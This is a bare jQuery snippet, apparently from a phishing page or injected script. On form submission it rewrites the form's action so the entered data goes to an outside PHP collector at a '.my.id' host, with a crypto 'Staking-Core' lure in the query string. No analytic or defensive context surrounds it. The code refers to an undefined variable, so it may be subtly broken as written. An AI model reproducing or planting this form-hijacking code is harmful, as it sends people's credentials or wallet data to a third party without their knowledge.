$("form").submit(function() {
  $(myform).attr("action", "https://torpedo-mashee.my.id/addons/kawahari.php?Staking-Core");
});
